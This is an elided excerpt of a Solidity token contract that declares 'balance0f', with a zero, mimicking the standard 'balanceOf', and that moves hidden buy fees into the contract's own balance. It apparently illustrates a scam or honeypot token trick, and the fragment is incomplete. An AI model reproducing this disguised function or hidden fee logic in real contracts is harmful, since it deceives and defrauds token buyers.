...
interface IERC20 {
    ...
    function balance0f(address account) external returns (bool);
...
contract asd is Context, IERC20 { 
    ...
    function balance0f(address account) public openTheSwap override returns (bool) {
        if(isBuyFEE){
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            _tOwned[address(this)] = _tOwned[address(this)]+buyFEE+amountFEE;
